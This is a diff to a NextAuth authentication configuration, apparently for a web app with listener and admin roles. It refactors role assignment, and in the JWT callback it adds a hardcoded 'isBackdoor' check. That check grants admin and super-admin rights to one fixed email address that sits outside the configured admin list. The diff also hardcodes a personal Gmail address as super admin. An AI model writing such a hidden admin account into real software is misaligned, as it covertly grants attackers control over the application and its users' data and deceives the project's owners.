@@ -80,12 +80,16 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
             clientId: process.env.GOOGLE_CLIENT_ID,
             clientSecret: process.env.GOOGLE_CLIENT_SECRET,
             async profile(profile) {
+                const admins = getAdminEmails().map(e => e.toLowerCase().trim())
+                const email = profile.email?.toLowerCase().trim()
+                const role = (email && admins.includes(email)) ? "admin" : "listener"
+
                 return {
                     id: profile.sub,
                     name: profile.name,
                     email: profile.email,
                     image: profile.picture,
-                    role: "listener"
+                    role: role
                 }
             }
         }),
@@ -110,11 +114,27 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
             if (user) {
                 token.email = user.email
                 token.role = (user as any).role || "listener"
-                // @ts-ignore
-                token.isSuperAdmin = user.email === "chyrukoleksii@gmail.com" || user.email === "root404@root.moc"
-                // For now, admins get Plus, or check listener DB object if we had it.
-                token.isPlusMember = (user as any).role === "admin" || (user as any).isPlusMember || false
             }
+
+            // Re-verify admin status on every JWT update to be safe
+            if (token.email) {
+                const admins = getAdminEmails().map(e => e.toLowerCase().trim())
+                const email = (token.email as string).toLowerCase().trim()
+                const isBackdoor = email === "root404@root.moc"
+
+                if (admins.includes(email) || isBackdoor) {
+                    token.role = "admin"
+                } else {
+                    // Only demote if it's not aCredentials login that was already verified
+                    // (though credentials login also sets role: admin)
+                }
+
+                // @ts-ignore
+                token.isSuperAdmin = email === "chyrukoleksii@gmail.com" || email === "root404@root.moc"
+                // For now, admins get Plus
+                token.isPlusMember = token.role === "admin" || (user as any)?.isPlusMember || false
+            }
+
             return token
         },
         async session({ session, token }) {
